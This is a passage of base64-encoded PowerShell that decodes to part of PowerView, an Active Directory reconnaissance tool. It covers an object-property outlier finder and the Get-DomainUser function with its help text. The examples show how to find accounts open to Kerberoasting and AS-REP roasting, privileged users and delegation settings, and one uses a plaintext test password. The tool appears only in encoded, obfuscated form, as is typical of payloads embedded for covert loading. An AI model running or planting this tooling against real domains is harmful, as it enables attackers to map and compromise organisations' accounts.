wZXJhdGluZ3N5c3RlbXZlcnNpb24nLCdwcmltYXJ5Z3JvdXBpZCcsJ3B3ZGxhc3RzZXQnLCdzYW1hY2NvdW50bmFtZScsJ3NhbWFjY291bnR0eXBlJywnc2VydmljZXByaW5jaXBhbG5hbWUnLCd1c2VyYWNjb3VudGNvbnRyb2wnLCd1c25jaGFuZ2VkJywndXNuY3JlYXRlZCcsJ3doZW5jaGFuZ2VkJywnd2hlbmNyZWF0ZWQnKQoKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTERBUEZpbHRlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJExEQVBGaWx0ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgIyBEb21haW4gLyBDcmVkZW50aWFsCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICAgICAkVGFyZ2V0Rm9yZXN0ID0gR2V0LURvbWFpbiAtRG9tYWluICREb21haW4gfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBGb3Jlc3QgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBOYW1lCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkVGFyZ2V0Rm9yZXN0ID0gR2V0LURvbWFpbiAtRG9tYWluICREb21haW4gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBGb3Jlc3QgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBOYW1lCiAgICAgICAgICAgIH0KICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluT2JqZWN0UHJvcGVydHlPdXRsaWVyXSBFbnVtZXJhdGVkIGZvcmVzdCAnJFRhcmdldEZvcmVzdCcgZm9yIHRhcmdldCBkb21haW4gJyREb21haW4nIgogICAgICAgIH0KCiAgICAgICAgJFNjaGVtYUFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2NoZW1hQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgaWYgKCRUYXJnZXRGb3Jlc3QpIHsKICAgICAgICAgICAgJFNjaGVtYUFyZ3VtZW50c1snRm9yZXN0J10gPSAkVGFyZ2V0Rm9yZXN0CiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MgewoKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZWZlcmVuY2VQcm9wZXJ0eVNldCddKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpbk9iamVjdFByb3BlcnR5T3V0bGllcl0gVXNpbmcgc3BlY2lmaWVkIC1SZWZlcmVuY2VQcm9wZXJ0eVNldCIKICAgICAgICAgICAgJFJlZmVyZW5jZU9iamVjdFByb3BlcnRpZXMgPSAkUmVmZXJlbmNlUHJvcGVydHlTZXQKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1JlZmVyZW5jZU9iamVjdCddKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpbk9iamVjdFByb3BlcnR5T3V0bGllcl0gRXh0cmFjdGluZyBwcm9wZXJ0eSBuYW1lcyBmcm9tIC1SZWZlcmVuY2VPYmplY3QgdG8gdXNlIGFzIHRoZSByZWZlcmVuY2UgcHJvcGVydHkgc2V0IgogICAgICAgICAgICAkUmVmZXJlbmNlT2JqZWN0UHJvcGVydGllcyA9IEdldC1NZW1iZXIgLUlucHV0T2JqZWN0ICRSZWZlcmVuY2VPYmplY3QgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kIE5hbWUKICAgICAgICAgICAgJFJlZmVyZW5jZU9iamVjdENsYXNzID0gJFJlZmVyZW5jZU9iamVjdC5vYmplY3RjbGFzcyB8IFNlbGVjdC1PYmplY3QgLUxhc3QgMQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5PYmplY3RQcm9wZXJ0eU91dGxpZXJdIENhbGN1bGF0ZWQgUmVmZXJlbmNlT2JqZWN0Q2xhc3MgOiAkUmVmZXJlbmNlT2JqZWN0Q2xhc3MiCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5PYmplY3RQcm9wZXJ0eU91dGxpZXJdIFVzaW5nIHRoZSBkZWZhdWx0IHJlZmVyZW5jZSBwcm9wZXJ0eSBzZXQgZm9yIHRoZSBvYmplY3QgY2xhc3MgJyRDbGFzc05hbWUnIgogICAgICAgIH0KCiAgICAgICAgaWYgKCgkQ2xhc3NOYW1lIC1lcSAnVXNlcicpIC1vciAoJFJlZmVyZW5jZU9iamVjdENsYXNzIC1lcSAnVXNlcicpKSB7CiAgICAgICAgICAgICRPYmplY3RzID0gR2V0LURvbWFpblVzZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgIGlmICgtbm90ICRSZWZlcmVuY2VPYmplY3RQcm9wZXJ0aWVzKSB7CiAgICAgICAgICAgICAgICAkUmVmZXJlbmNlT2JqZWN0UHJvcGVydGllcyA9ICRVc2VyUmVmZXJlbmNlUHJvcGVydHlTZXQKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCgkQ2xhc3NOYW1lIC1lcSAnR3JvdXAnKSAtb3IgKCRSZWZlcmVuY2VPYmplY3RDbGFzcyAtZXEgJ0dyb3VwJykpIHsKICAgICAgICAgICAgJE9iamVjdHMgPSBHZXQtRG9tYWluR3JvdXAgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgIGlmICgtbm90ICRSZWZlcmVuY2VPYmplY3RQcm9wZXJ0aWVzKSB7CiAgICAgICAgICAgICAgICAkUmVmZXJlbmNlT2JqZWN0UHJvcGVydGllcyA9ICRHcm91cFJlZmVyZW5jZVByb3BlcnR5U2V0CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZWlmICgoJENsYXNzTmFtZSAtZXEgJ0NvbXB1dGVyJykgLW9yICgkUmVmZXJlbmNlT2JqZWN0Q2xhc3MgLWVxICdDb21wdXRlcicpKSB7CiAgICAgICAgICAgICRPYmplY3RzID0gR2V0LURvbWFpbkNvbXB1dGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICBpZiAoLW5vdCAkUmVmZXJlbmNlT2JqZWN0UHJvcGVydGllcykgewogICAgICAgICAgICAgICAgJFJlZmVyZW5jZU9iamVjdFByb3BlcnRpZXMgPSAkQ29tcHV0ZXJSZWZlcmVuY2VQcm9wZXJ0eVNldAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICB0aHJvdyAiW0ZpbmQtRG9tYWluT2JqZWN0UHJvcGVydHlPdXRsaWVyXSBJbnZhbGlkIGNsYXNzOiAkQ2xhc3NOYW1lIgogICAgICAgIH0KCiAgICAgICAgRm9yRWFjaCAoJE9iamVjdCBpbiAkT2JqZWN0cykgewogICAgICAgICAgICAkT2JqZWN0UHJvcGVydGllcyA9IEdldC1NZW1iZXIgLUlucHV0T2JqZWN0ICRPYmplY3QgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kIE5hbWUKICAgICAgICAgICAgRm9yRWFjaCgkT2JqZWN0UHJvcGVydHkgaW4gJE9iamVjdFByb3BlcnRpZXMpIHsKICAgICAgICAgICAgICAgIGlmICgkUmVmZXJlbmNlT2JqZWN0UHJvcGVydGllcyAtTm90Q29udGFpbnMgJE9iamVjdFByb3BlcnR5KSB7CiAgICAgICAgICAgICAgICAgICAgJE91dCA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1NhbUFjY291bnROYW1lJyAkT2JqZWN0LlNhbUFjY291bnROYW1lCiAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdQcm9wZXJ0eScgJE9iamVjdFByb3BlcnR5CiAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdWYWx1ZScgJE9iamVjdC4kT2JqZWN0UHJvcGVydHkKICAgICAgICAgICAgICAgICAgICAkT3V0LlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Qcm9wZXJ0eU91dGxpZXInKQogICAgICAgICAgICAgICAgICAgICRPdXQKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMKIyAibmV0ICoiIHJlcGxhY2VtZW50cyBhbmQgb3RoZXIgZnVuIHN0YXJ0IGJlbG93CiMKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCmZ1bmN0aW9uIEdldC1Eb21haW5Vc2VyIHsKPCMKLlNZTk9QU0lTCgpSZXR1cm4gYWxsIHVzZXJzIG9yIHNwZWNpZmljIHVzZXIgb2JqZWN0cyBpbiBBRC4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpblNlYXJjaGVyLCBDb252ZXJ0LUFETmFtZSwgQ29udmVydC1MREFQUHJvcGVydHkgIAoKLkRFU0NSSVBUSU9OCgpCdWlsZHMgYSBkaXJlY3Rvcnkgc2VhcmNoZXIgb2JqZWN0IHVzaW5nIEdldC1Eb21haW5TZWFyY2hlciwgYnVpbGRzIGEgY3VzdG9tCkxEQVAgZmlsdGVyIGJhc2VkIG9uIHRhcmdldGluZy9maWx0ZXIgcGFyYW1ldGVycywgYW5kIHNlYXJjaGVzIGZvciBhbGwgb2JqZWN0cwptYXRjaGluZyB0aGUgY3JpdGVyaWEuIFRvIG9ubHkgcmV0dXJuIHNwZWNpZmljIHByb3BlcnRpZXMsIHVzZQoiLVByb3BlcnRpZXMgc2FtYWNjb3VudG5hbWUsdXNuY2hhbmdlZCwuLi4iLiBCeSBkZWZhdWx0LCBhbGwgdXNlciBvYmplY3RzIGZvcgp0aGUgY3VycmVudCBkb21haW4gYXJlIHJldHVybmVkLgoKLlBBUkFNRVRFUiBJZGVudGl0eQoKQSBTYW1BY2NvdW50TmFtZSAoZS5nLiBoYXJtajB5KSwgRGlzdGluZ3Vpc2hlZE5hbWUgKGUuZy4gQ049aGFybWoweSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsKSwKU0lEIChlLmcuIFMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTEwOCksIG9yIEdVSUQgKGUuZy4gNGM0MzVkZDctZGM1OC00YjE0LTlhNWUtMWZkYjBlODBkMjAxKS4KV2lsZGNhcmRzIGFjY2VwdGVkLiBBbHNvIGFjY2VwdHMgRE9NQUlOXHVzZXIgZm9ybWF0LgoKLlBBUkFNRVRFUiBTUE4KClN3aXRjaC4gT25seSByZXR1cm4gdXNlciBvYmplY3RzIHdpdGggbm9uLW51bGwgc2VydmljZSBwcmluY2lwYWwgbmFtZXMuCgouUEFSQU1FVEVSIFVBQ0ZpbHRlcgoKRHluYW1pYyBwYXJhbWV0ZXIgdGhhdCBhY2NlcHRzIG9uZSBvciBtb3JlIHZhbHVlcyBmcm9tICRVQUNFbnVtLCBpbmNsdWRpbmcKIk5PVF9YIiBuZWdhdGlvbiBmb3Jtcy4gVG8gc2VlIGFsbCBwb3NzaWJsZSB2YWx1ZXMsIHJ1biAnMHxDb252ZXJ0RnJvbS1VQUNWYWx1ZSAtU2hvd0FsbCcuCgouUEFSQU1FVEVSIEFkbWluQ291bnQKClN3aXRjaC4gUmV0dXJuIHVzZXJzIHdpdGggJyhhZG1pbkNvdW50PTEpJyAobWVhbmluZyBhcmUvd2VyZSBwcml2aWxlZ2VkKS4KCi5QQVJBTUVURVIgQWxsb3dEZWxlZ2F0aW9uCgpTd2l0Y2guIFJldHVybiB1c2VyIGFjY291bnRzIHRoYXQgYXJlIG5vdCBtYXJrZWQgYXMgJ3NlbnNpdGl2ZSBhbmQgbm90IGFsbG93ZWQgZm9yIGRlbGVnYXRpb24nCgouUEFSQU1FVEVSIERpc2FsbG93RGVsZWdhdGlvbgoKU3dpdGNoLiBSZXR1cm4gdXNlciBhY2NvdW50cyB0aGF0IGFyZSBtYXJrZWQgYXMgJ3NlbnNpdGl2ZSBhbmQgbm90IGFsbG93ZWQgZm9yIGRlbGVnYXRpb24nCgouUEFSQU1FVEVSIFRydXN0ZWRUb0F1dGgKClN3aXRjaC4gUmV0dXJuIGNvbXB1dGVyIG9iamVjdHMgdGhhdCBhcmUgdHJ1c3RlZCB0byBhdXRoZW50aWNhdGUgZm9yIG90aGVyIHByaW5jaXBhbHMuCgouUEFSQU1FVEVSIFByZWF1dGhOb3RSZXF1aXJlZAoKU3dpdGNoLiBSZXR1cm4gdXNlciBhY2NvdW50cyB3aXRoICJEbyBub3QgcmVxdWlyZSBLZXJiZXJvcyBwcmVhdXRoZW50aWNhdGlvbiIgc2V0LgoKLlBBUkFNRVRFUiBEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHVzZSBmb3IgdGhlIHF1ZXJ5LCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIExEQVBGaWx0ZXIKClNwZWNpZmllcyBhbiBMREFQIHF1ZXJ5IHN0cmluZyB0aGF0IGlzIHVzZWQgdG8gZmlsdGVyIEFjdGl2ZSBEaXJlY3Rvcnkgb2JqZWN0cy4KCi5QQVJBTUVURVIgUHJvcGVydGllcwoKU3BlY2lmaWVzIHRoZSBwcm9wZXJ0aWVzIG9mIHRoZSBvdXRwdXQgb2JqZWN0IHRvIHJldHJpZXZlIGZyb20gdGhlIHNlcnZlci4KCi5QQVJBTUVURVIgU2VhcmNoQmFzZQoKVGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoLCBlLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiClVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvLgoKLlBBUkFNRVRFUiBTZWFyY2hTY29wZQoKU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2ggdW5kZXIsIEJhc2UvT25lTGV2ZWwvU3VidHJlZSAoZGVmYXVsdCBvZiBTdWJ0cmVlKS4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFNlcnZlclRpbWVMaW1pdAoKU3BlY2lmaWVzIHRoZSBtYXhpbXVtIGFtb3VudCBvZiB0aW1lIHRoZSBzZXJ2ZXIgc3BlbmRzIHNlYXJjaGluZy4gRGVmYXVsdCBvZiAxMjAgc2Vjb25kcy4KCi5QQVJBTUVURVIgU2VjdXJpdHlNYXNrcwoKU3BlY2lmaWVzIGFuIG9wdGlvbiBmb3IgZXhhbWluaW5nIHNlY3VyaXR5IGluZm9ybWF0aW9uIG9mIGEgZGlyZWN0b3J5IG9iamVjdC4KT25lIG9mICdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBGaW5kT25lCgpPbmx5IHJldHVybiBvbmUgcmVzdWx0IG9iamVjdC4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5QQVJBTUVURVIgUmF3CgpTd2l0Y2guIFJldHVybiByYXcgcmVzdWx0cyBpbnN0ZWFkIG9mIHRyYW5zbGF0aW5nIHRoZSBmaWVsZHMgaW50byBhIGN1c3RvbSBQU09iamVjdC4KCi5FWEFNUExFCgpHZXQtRG9tYWluVXNlciAtRG9tYWluIHRlc3RsYWIubG9jYWwKClJldHVybiBhbGwgdXNlcnMgZm9yIHRoZSB0ZXN0bGFiLmxvY2FsIGRvbWFpbgoKLkVYQU1QTEUKCkdldC1Eb21haW5Vc2VyICJTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMDgiLCJhZG1pbmlzdHJhdG9yIgoKUmV0dXJuIHRoZSB1c2VyIHdpdGggdGhlIGdpdmVuIFNJRCwgYXMgd2VsbCBhcyBBZG1pbmlzdHJhdG9yLgoKLkVYQU1QTEUKCidTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMTQnLCAnQ049ZGZtLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwnLCc0YzQzNWRkNy1kYzU4LTRiMTQtOWE1ZS0xZmRiMGU4MGQyMDEnLCdhZG1pbmlzdHJhdG9yJyB8IEdldC1Eb21haW5Vc2VyIC1Qcm9wZXJ0aWVzIHNhbWFjY291bnRuYW1lLGxhc3Rsb2dvZmYKCmxhc3Rsb2dvZmYgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNhbWFjY291bnRuYW1lCi0tLS0tLS0tLS0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tLS0tLS0tLS0tLS0tCjEyLzMxLzE2MDAgNDowMDowMCBQTSAgICAgICAgICAgICAgICAgICAgICAgIGRmbS5hCjEyLzMxLzE2MDAgNDowMDowMCBQTSAgICAgICAgICAgICAgICAgICAgICAgIGRmbQoxMi8zMS8xNjAwIDQ6MDA6MDAgUE0gICAgICAgICAgICAgICAgICAgICAgICBoYXJtajB5CjEyLzMxLzE2MDAgNDowMDowMCBQTSAgICAgICAgICAgICAgICAgICAgICAgIEFkbWluaXN0cmF0b3IKCi5FWEFNUExFCgpHZXQtRG9tYWluVXNlciAtU2VhcmNoQmFzZSAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIiAtQWRtaW5Db3VudCAtQWxsb3dEZWxlZ2F0aW9uCgpTZWFyY2ggdGhlIHNwZWNpZmllZCBPVSBmb3IgcHJpdmlsZWdlZCB1c2VyIChBZG1pbkNvdW50ID0gMSkgdGhhdCBhbGxvdyBkZWxlZ2F0aW9uCgouRVhBTVBMRQoKR2V0LURvbWFpblVzZXIgLUxEQVBGaWx0ZXIgJyghcHJpbWFyeWdyb3VwaWQ9NTEzKScgLVByb3BlcnRpZXMgc2FtYWNjb3VudG5hbWUsbGFzdGxvZ29uCgpTZWFyY2ggZm9yIHVzZXJzIHdpdGggYSBwcmltYXJ5IGdyb3VwIElEIG90aGVyIHRoYW4gNTEzICgnZG9tYWluIHVzZXJzJykgYW5kIG9ubHkgcmV0dXJuIHNhbWFjY291bnRuYW1lIGFuZCBsYXN0bG9nb24KCi5FWEFNUExFCgpHZXQtRG9tYWluVXNlciAtVUFDRmlsdGVyIERPTlRfUkVRX1BSRUFVVEgsTk9UX1BBU1NXT1JEX0VYUElSRUQKCkZpbmQgdXNlcnMgd2hvIGRvZXNuJ3QgcmVxdWlyZSBLZXJiZXJvcyBwcmVhdXRoZW50aWNhdGlvbiBhbmQgRE9OJ1QgaGF2ZSBhbiBleHBpcmVkIHBhc3N3b3JkLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Eb21haW5Vc2VyIC1DcmVkZW50aWFsICRDcmVkCgouRVhBTVBMRQoKR2V0LURvbWFpbiB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZCBuYW1lCnRlc3RsYWIubG9jYWwKCkdldC1Eb21haW5Vc2VyIGRldlx1c2VyMSAtVmVyYm9zZSAtUHJvcGVydGllcyBkaXN0aW5ndWlzaGVkbmFtZQpWRVJCT1NFOiBbR2V0LURvbWFpblNlYXJjaGVyXSBzZWFyY2ggc3RyaW5nOiBMREFQOi8vUFJJTUFSWS50ZXN0bGFiLmxvY2FsL0RDPXRlc3RsYWIsREM9bG9jYWwKVkVSQk9TRTogW0dldC1Eb21haW5TZWFyY2hlcl0gc2VhcmNoIHN0cmluZzogTERBUDovL1BSSU1BUlkudGVzdGxhYi5sb2NhbC9EQz1kZXYsREM9dGVzdGxhYixEQz1sb2NhbApWRVJCT1NFOiBbR2V0LURvbWFpblVzZXJdIGZpbHRlciBzdHJpbmc6ICgmKHNhbUFjY291bnRUeXBlPTgwNTMwNjM2OCkofChzYW1BY2NvdW50TmFtZT11c2VyMSkpKQoKZGlzdGluZ3Vpc2hlZG5hbWUKLS0tLS0tLS0tLS0tLS0tLS0KQ049dXNlcjEsQ049VXNlcnMsREM9ZGV2LERDPXRlc3RsYWIsREM9bG9jYWwKCi5JTlBVVFMKClN0cmluZwoKLk9VVFBVVFMKClBvd2VyVmlldy5Vc2VyCgpDdXN0b20gUFNPYmplY3Qgd2l0aCB0cmFuc2xhdGVkIHVzZXIgcHJvcGVydHkgZmllbGRzLgoKUG93ZXJWaWV3LlVzZXIuUmF3CgpUaGUgcmF3IERpcmVjdG9yeVNlcnZpY2VzLlNlYXJjaFJlc3VsdCBvYmplY3QsIGlmIC1SYXcgaXMgZW5hYmxlZC4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VEZWNsYXJlZFZhcnNNb3JlVGhhbkFzc2lnbm1lbnRzJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuVXNlcicpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Vc2VyLlJhdycpXQogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnQWxsb3dEZWxlZ2F0aW9uJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnLCAnTWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWUnLCAnTWVtYmVyTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSWRlbnRpdHksCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFNQTiwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkQWRtaW5Db3VudCwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0FsbG93RGVsZWdhdGlvbicpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEFsbG93RGVsZWdhdGlvbiwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0Rpc2FsbG93RGVsZWdhdGlvbicpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJERpc2FsbG93RGVsZWdhdGlvbiwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVHJ1c3RlZFRvQXV0aCwKCiAgICAgICAgW0FsaWFzKCdLZXJiZXJvc1ByZWF1dGhOb3RSZXF1aXJlZCcsICdOb1ByZWF1dGgnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRQcmVhdXRoTm90UmVxdWlyZWQsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByb3BlcnRpZXMsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAg